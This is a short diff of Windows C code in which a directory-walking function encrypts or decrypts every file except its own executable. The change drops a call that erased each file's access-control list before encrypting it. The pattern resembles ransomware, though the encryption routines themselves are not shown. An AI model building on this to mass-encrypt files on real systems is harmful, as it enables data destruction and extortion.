@@ -3,7 +3,6 @@
 #include <string.h>
 #include <stdbool.h>
 #include <windows.h>
-#include <winkit.h>
 #include "airf.h"
 
 void iterate_dir(char *op, char *execp) {
@@ -53,10 +52,9 @@ void iterate_dir(char *op, char *execp) {
 		} else if (strcmp(THISNAME, namebuf) == 0) {
 			//stupid bitwise
 		} else {
-			if (strcmp("-e", op) == 0) {
-				erase_file_dacl(wd.cFileName);
+			if (strcmp("-e", op) == 0) 
 				fencrypt(wd.cFileName);
-			} else if (strcmp("-d", op) == 0)
+			else if (strcmp("-d", op) == 0)
 				fdecrypt(wd.cFileName);
 			else {
 				printf("%s\n", "Invalid program argument.");
